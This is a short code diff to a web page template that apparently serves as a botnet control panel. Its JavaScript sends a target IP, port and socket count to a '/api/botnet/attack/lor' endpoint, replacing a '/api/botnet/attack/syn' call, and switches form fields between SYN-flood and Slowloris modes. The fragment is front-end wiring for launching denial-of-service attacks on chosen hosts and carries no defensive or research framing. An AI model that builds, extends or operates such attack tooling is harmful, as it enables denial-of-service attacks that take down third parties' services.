@@ -206,12 +206,11 @@ content%}
 			console.log(datip);
 			$.ajax({
 				type: "POST",
-				url: "/api/botnet/attack/syn",
+				url: "/api/botnet/attack/lor",
 				data: {
 					t_ip: ip,
 					t_port: port,
-					t_packet: $("#packet").val(),
-					t_thread: $("#thread").val(),
+					t_socket: $("#socket").val(),
 				},
 				success: (res) => {
 					Toastify({
@@ -254,10 +253,12 @@ content%}
 		$("#mode").on("change", () => {
 			if ($("#mode").val() == "syn") {
 				$("#thread").removeClass("hidden");
+				$("#packet").removeClass("hidden");
 				$("#socket").addClass("hidden");
 			} else if ($("#mode").val() == "lor") {
 				$("#thread").addClass("hidden");
 				$("#socket").removeClass("hidden");
+				$("#packet").addClass("hidden");
 			}
 		});
 	});
